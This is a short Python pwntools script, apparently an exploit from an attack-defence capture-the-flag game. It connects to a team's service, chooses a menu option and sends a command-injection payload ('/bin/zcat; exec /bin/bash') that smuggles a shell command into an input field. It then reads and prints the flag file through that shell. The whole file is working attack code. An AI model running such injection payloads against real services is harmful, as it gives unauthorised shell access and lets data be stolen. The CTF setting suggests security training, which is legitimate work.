from pwn import *
from random import randint
import sys

context.log_level = 'debug'

def get_flag(host, port, flag_id, token):
    c = remote(host,port)
    c.recvline()
    c.recvline()
    c.recvline()
    c.recvline()
    c.sendline("2")
    c.recvuntil(' ',drop=True)
    c.sendline("/bin/zcat; exec /bin/bash; t\n")
    data=c.recvuntil('"$@"', drop=True)
    c.sendline('cat ' + flag_id + '*\n')
    data=c.recvline()
    data=c.recvline()
    print(data)
    c.close()
    return data


get_flag('team8',10001,'2a6q9n8x2y7j2h7x7y0t','token')
